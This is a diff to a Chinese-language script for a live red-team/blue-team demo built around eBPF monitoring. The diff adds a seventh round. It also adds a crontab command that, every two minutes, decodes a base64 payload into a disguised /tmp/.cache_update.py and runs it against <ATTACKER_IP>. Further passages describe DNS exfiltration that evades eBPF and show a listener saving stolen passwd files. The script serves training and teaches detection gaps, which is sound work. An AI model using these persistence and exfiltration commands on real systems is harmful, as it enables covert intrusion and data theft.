@@ -1,4 +1,4 @@
-# Attack-Defense Demo Flow — 6 回合攻防演練腳本
+# Attack-Defense Demo Flow — 7 回合攻防演練腳本
 
 > 這份是 Demo 當天的執行腳本，照著跑就好。
 > 每回合大概 2-3 分鐘，全程大約 20-25 分鐘。
@@ -346,13 +346,29 @@ Agent 會自動：
 [+] Saved: ./loot/bash_history
 ```
 
+### T3 — 植入 Crontab 持久化（為回合 7 埋伏筆）
+
+透過 C2 設定 crontab，讓 exfil agent 每 2 分鐘自動重新部署並執行：
+
+```
+C2> bash red_team/deploy_agent.sh <ATTACKER_IP>
+```
+
+將產生的 deploy 指令改成 crontab 格式貼入 C2：
+
+```
+C2> (crontab -l 2>/dev/null; echo "*/2 * * * * echo '<base64>' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>") | crontab -
+```
+
+> 這步不用特別展示，快速帶過即可。重點是讓回合 7 有持久化的前提。
+
 ### 講解要點
 
 - 紅方取得控制後**立即**外傳資料 — 這才是真實攻擊的流程
 - DNS exfiltration 把資料編碼成 subdomain（`data.fileid.x.exfil.local`），看起來像普通 DNS query
 - 這類 covert channel 不觸發 eBPF 監控的任何 syscall pattern（沒有 memfd、沒有 reverse shell）
-- 即使後續藍方開啟 eBPF v1/v2，資料**已經外傳完畢**，防禦來不及
-- 要偵測 DNS exfiltration 需要另外的機制：DNS query pattern 分析、subdomain 長度異常偵測等
+- 同時植入 crontab 持久化，確保即使 C2 斷線，資料外傳也會持續
+- MITRE ATT&CK: **T1053.003** (Scheduled Task/Job: Cron)
 
 ---
 
@@ -565,20 +581,74 @@ Listener 不會收到連線（進程在 connect() 前被殺）。
 
 ---
 
+## 回合 7 — 持久化外傳：防禦全開仍有缺口
+
+> **目的**：展示回合 2b 植入的 crontab 持久化在所有防禦上線後仍持續運作，DNS exfiltration 完全繞過 eBPF v2
+> **MITRE ATT&CK**: T1053.003 (Persistence: Cron), T1048.003 (Exfiltration Over Alternative Protocol)
+
+### T3 — 確認 Exfil Listener 仍在運行
+
+Listener 應該從回合 2b 就一直開著。如果已關閉，重新啟動：
+
+```bash
+sudo .venv/bin/python3 red_team/exfil_listener.py
+```
+
+### T2 — 確認 eBPF v2 仍在運行（--kill 模式）
+
+eBPF v2 應該從回合 6 就一直開著。
+
+### 等待 Crontab 觸發
+
+回合 2b 設定的 crontab 每 2 分鐘執行一次。等待觸發（最多 2 分鐘）。
+
+### T3 — 觀察 Listener 接收到新資料
+
+預期輸出：
+```
+[+] START file_id=a1b2 filename=passwd
+[+] Receiving: 0003/0042 (a1b2)
+...
+[+] Saved: ./loot/passwd
+```
+
+### T2 — 觀察 eBPF v2
+
+**重點：eBPF v2 沒有任何新 alert。**
+
+exfil agent 使用的 syscall：
+- `socket(AF_INET, SOCK_DGRAM)` — 普通 UDP socket，不是 SOCK_RAW
+- `sendto()` — 送 DNS query 到 port 53
+- 沒有 memfd_create、沒有 /proc/fd execve、沒有 dup2、沒有可疑 port connect
+
+→ 完全不觸發 v2 的任何 hook。
+
+### 講解要點
+
+- 回合 2b 植入的 crontab **存活了整場攻防** — 藍方的 eBPF kill、v2 升級都沒有清除它
+- eBPF 監控的是 **syscall 行為**，但 DNS exfiltration 用的全是合法 syscall
+- 防禦缺口：
+  - eBPF v1/v2 不監控 DNS 流量內容
+  - 網路層 MDR 只封鎖已知 IP，不分析 DNS query pattern
+- 要偵測需要額外機制：DNS query pattern 分析、subdomain 長度/頻率異常偵測、DNS over HTTPS 監控
+- **結論**：defense-in-depth 是持續的過程，部署完兩層防禦不代表安全，攻擊者永遠在找 blind spot
+
+---
+
 ## 結尾總結
 
 ### 攻防時間線
 
 ```
-回合1     回合1b       回合1c      回合2         回合2b        回合3
-偵察   →  蜜罐觸發  →  IP切換   → 紅方攻擊成功 → 資料外傳   → 藍方清除威脅
-nmap      nc 2222      ip alias    SSTI+memfd    DNS exfil     cold-start
-          MDR封鎖      繞過封鎖    ICMP C2        covert ch     /proc scan
+回合1     回合1b       回合1c      回合2         回合2b          回合3
+偵察   →  蜜罐觸發  →  IP切換   → 紅方攻擊成功 → 外傳+持久化  → 藍方清除威脅
+nmap      nc 2222      ip alias    SSTI+memfd    DNS exfil       cold-start
+          MDR封鎖      繞過封鎖    ICMP C2        +crontab        /proc scan
 
-回合4         回合5           回合6
-紅方再攻被擋 → 紅方繞過v1   → 藍方升級v2攔截
-eBPF kill      reverse shell   connect hook
-memfd blocked  TCP bypass      port detect
+回合4         回合5           回合6           回合7
+紅方再攻被擋 → 紅方繞過v1   → 藍方升級v2攔截 → 持久化外傳（防禦缺口）
+eBPF kill      reverse shell   connect hook     crontab 觸發 exfil
+memfd blocked  TCP bypass      port detect      eBPF v2 偵測不到
 ```
 
 ### 防禦分層架構
